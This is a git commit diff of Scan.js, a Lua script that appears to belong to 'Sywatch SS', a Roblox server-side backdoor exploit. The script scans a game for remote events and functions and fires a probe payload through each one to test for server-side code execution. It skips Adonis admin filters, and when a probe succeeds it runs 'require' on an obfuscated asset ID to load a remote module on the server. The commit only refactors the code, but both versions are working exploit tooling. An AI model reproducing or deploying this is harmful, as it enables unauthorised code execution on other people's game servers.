b2ef777b360e64ea786c475ec97dc0958411fb93
/ SlashCoders <156876187+SwitchWatcher@users.noreply.github.com>
2025-07-24 11:20:05 +0800

    Update Scan.js

--- Scan.js
+++ Scan.js
@@ -1,18 +1,20 @@
 return function(STATEMENT_TRUE, STATEMENT_FALSE)
 	function notify(text)
-		game:GetService("StarterGui"):SetCore("SendNotification", {Title="Sywatch SS",Duration=5,Text=text})
+		pcall(function()
+			game:GetService("StarterGui"):SetCore("SendNotification", {
+				Duration = 5,
+				Title = "Sywatch SS",
+				Icon = "rbxassetid://16680995499",
+				Text = text,
+				Button1 = "CLOSE"
+			})
+		end)
 	end
 	function debug(Text, LVL)
 		local func = print
-		if (LVL == 1) then
-			func = print
-		end
-		if (LVL == 2) then
-			func = error
-		end
-		if (LVL == 3) then
-			func = warn
-		end
+		if LVL == 1 then func = print end
+		if LVL == 2 then func = error end
+		if LVL == 3 then func = warn end
 		func("Sywatch SS: " .. Text)
 	end
 	function runRemote(v, data)
@@ -24,41 +26,38 @@ return function(STATEMENT_TRUE, STATEMENT_FALSE)
 			end)
 		end
 	end
-	function generateName(lenght)
-		local alphabet = {"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"}
+	function generateName(length)
+		local alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 		local text = ""
-		for i = 1, lenght do
-			text = text .. alphabet[math.random(1, #alphabet)]
+		for i = 1, length do
+			local randIndex = math.random(1, #alphabet)
+			text = text .. alphabet:sub(randIndex, randIndex)
 		end
 		return text
 	end
 	function findRemote()
 		local remotes = {}
 		local protected_backdoor = game:GetService("ReplicatedStorage"):FindFirstChild("Sywatch SS" .. ((game.PlaceId / 7777) * 6009 * game.PlaceId))
-		if (protected_backdoor and protected_backdoor:IsA("RemoteFunction")) then
-			while true do
+		if protected_backdoor and protected_backdoor:IsA("RemoteFunction") then
+			local code
+			repeat
 				code = generateName(math.random(12, 30))
-				if not remotes[code] then
-					break
-				end
-			end
+			until not remotes[code]
 			spawn(function()
 				protected_backdoor:InvokeServer("Sywatch SS", "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
 			end)
 			remotes[code] = protected_backdoor
-		end
-		for i, v in game:GetDescendants() do
-			if not v:IsA("RemoteEvent") then
-				if not v:IsA("RemoteFunction") then
-					continue
-				end
+		end		
+		for _, v in ipairs(game:GetDescendants()) do
+			if not (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
+				continue
 			end
-			if (string.split(v:GetFullName(), ".")[1] == "RobloxReplicatedStorage") then
+			if string.split(v:GetFullName(), ".")[1] == "RobloxReplicatedStorage" then
 				debug("Roblox Replicated Storage (" .. v.Name .. ")", 1)
 				continue
 			end
 			if ((v.Parent == game:GetService("ReplicatedStorage")) or (v.Parent.Parent == game:GetService("ReplicatedStorage")) or (v.Parent.Parent.Parent == game:GetService("ReplicatedStorage"))) then
-				if (v:FindFirstChild("__FUNCTION") or (v.Name == "__FUNCTION")) then
+				if v:FindFirstChild("__FUNCTION") or v.Name == "__FUNCTION" then
 					debug("Adonis filter detected (" .. v.Name .. ")", 1)
 					continue
 				end
@@ -71,21 +70,16 @@ return function(STATEMENT_TRUE, STATEMENT_FALSE)
 					continue
 				end
 			end
-			while true do
+			repeat
 				code = generateName(math.random(12, 30))
-				if not remotes[code] then
-					break
-				end
-			end
+			until not remotes[code]
 			runRemote(v, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
 			remotes[code] = v
 			debug("Sended Backdoor '" .. v:GetFullName() .. "'", 1)
 		end
-		for i = 1, 100 do
-			for i, v in remotes do
-				if game:GetService("Workspace"):FindFirstChild(i) then
-					backdoor = true
-					AutoRun = true
+		for _ = 1, 100 do
+			for code, v in pairs(remotes) do
+				if game:GetService("Workspace"):FindFirstChild(code) then
 					debug(v:GetFullName(), 3)
 					runRemote(v, "require(171016405.1884*69)")
 					return true
@@ -94,9 +88,19 @@ return function(STATEMENT_TRUE, STATEMENT_FALSE)
 		end
 		return false
 	end
-	if findRemote() then
-		if STATEMENT_TRUE then pcall(STATEMENT_TRUE) end
-	else
-		if STATEMENT_FALSE then pcall(STATEMENT_FALSE) end
+	if not AutoRun then
+		AutoRun = true
+		debug("Scanning...", 3)
+		notify("Scanning...")
+		if findRemote() then
+			if STATEMENT_TRUE then
+				pcall(STATEMENT_TRUE)
+			end
+		else
+			if STATEMENT_FALSE then
+				pcall(STATEMENT_FALSE)
+			end
+		end
+		AutoRun = false
 	end
 end
